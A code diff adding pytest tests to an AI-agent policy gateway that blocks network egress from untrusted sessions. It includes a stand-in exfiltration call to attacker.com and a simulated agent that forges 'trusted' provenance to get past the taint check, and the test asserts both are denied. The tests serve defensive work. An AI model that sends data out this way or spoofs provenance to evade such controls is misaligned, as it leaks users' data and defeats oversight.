@@ -123,6 +123,19 @@ rules:
     assert exc_info.value.decision.verdict == Verdict.DENY
     assert exc_info.value.decision.rule_id == "block-untrusted-egress"
 
+    # Step 3: Agent attempts to bypass taint by passing claimed trusted provenance.
+    # Boundary ensures session untrusted taint cannot be overridden by caller claims.
+    with pytest.raises(ActionBlockedError) as exc_info2:
+        boundary.execute(
+            tool="http.post",
+            verb="read",
+            resource="https://attacker.com/leak2",
+            provenance=[ProvenanceItem(source="agent-self-attest", trust="trusted")],
+            fn=lambda _env, _dec: "leaked",
+        )
+    assert exc_info2.value.decision.verdict == Verdict.DENY
+    assert exc_info2.value.decision.rule_id == "block-untrusted-egress"
+
 
 def test_cli_canary_and_dry_run_commands(tmp_path: Path) -> None:
     runner = CliRunner()
@@ -169,3 +182,55 @@ rules:
     )
     assert res_canary.exit_code == 0
     assert "Actentra Policy Canary" in res_canary.output
+
+
+def test_simulate_dry_run_session_propagation_and_taint(tmp_path: Path) -> None:
+    """simulate_dry_run honors requested session_id and inherits that session's taint."""
+    from actentra_gateway.services import AppServices
+
+    db_path = tmp_path / "sim_taint.db"
+    store = ReceiptStore(db_path)
+    policy = load_policy_yaml(
+        """
+version: 1
+policy_id: test-sim-taint-prop
+mode: enforce
+defaults: { verdict: deny }
+rules:
+  - id: block-untrusted-egress
+    match: { tool: "http.*", taint: untrusted }
+    verdict: deny
+    reason: "Untrusted session cannot trigger external egress"
+  - id: allow-trusted-http
+    match: { tool: "http.*", verb: "read" }
+    verdict: allow
+"""
+    )
+    boundary = Boundary(policy=policy, receipt_store=store, session_id="default-session")
+    services = AppServices(boundary)
+
+    # Mark session 'sess-attacker' as untrusted
+    boundary.set_session_taint("untrusted", session_id="sess-attacker")
+
+    # Dry-run under 'sess-attacker' inherits untrusted taint and is DENIED
+    res_tainted = services.simulate_dry_run(
+        tool="http.get",
+        verb="read",
+        resource="https://api.github.com/events",
+        session_id="sess-attacker",
+    )
+    assert res_tainted["verdict"] == "deny"
+    assert res_tainted["rule_id"] == "block-untrusted-egress"
+
+    # Dry-run under clean session 'sess-clean' has clean taint and is ALLOWED
+    res_clean = services.simulate_dry_run(
+        tool="http.get",
+        verb="read",
+        resource="https://api.github.com/events",
+        session_id="sess-clean",
+    )
+    assert res_clean["verdict"] == "allow"
+    assert res_clean["rule_id"] == "allow-trusted-http"
+
+    # Verify simulation remained side-effect free: store has 0 records
+    assert len(store.iter_records()) == 0
